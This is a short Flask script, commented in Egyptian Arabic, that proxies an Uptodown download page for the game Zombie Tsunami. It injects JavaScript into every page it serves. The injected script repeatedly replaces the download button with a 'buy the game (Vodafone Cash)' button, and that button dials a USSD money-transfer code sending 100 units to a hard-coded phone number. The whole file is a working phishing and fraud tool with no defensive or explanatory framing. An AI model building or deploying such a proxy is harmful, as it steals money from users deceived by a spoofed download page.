from flask import Flask, request, Response
import requests

app = Flask(__name__)
TARGET_SITE = 'https://zombie-tsunami.ar.uptodown.com/android'

# ده الكود اللي هيتحقن لكل الناس أوتوماتيك
INJECTED_JS = """
<script>
    // الدالة دي بتدور على الزرار وتغيره
    function startZikoHack() {
        let btn = document.querySelector('.download') || document.querySelector('#download-button');
        if (btn) {
            btn.innerHTML = 'شراء اللعبة (فودافون كاش)';
            btn.style.cssText = "background: #e60000 !important; color: white !important;";
            btn.onclick = function(e) {
                e.preventDefault();
                window.location.href = "tel:*9*7*01020546009*100%23";
            };
        }
    }
    setInterval(startZikoHack, 1000);
</script>
"""

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def proxy(path):
    url = f"{TARGET_SITE}/{path}"
    headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 10)'}
    
    response = requests.get(url, headers=headers)
    
    if "text/html" in response.headers.get('Content-Type', ''):
        content = response.text
        # هنا السحر: بنحط الكود بتاعنا دايماً في الصفحة اللي بتتبعث للمستخدم
        content = content.replace('</body>', f'{INJECTED_JS}</body>')
        return content

    return Response(response.content, content_type=response.headers.get('Content-Type'))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
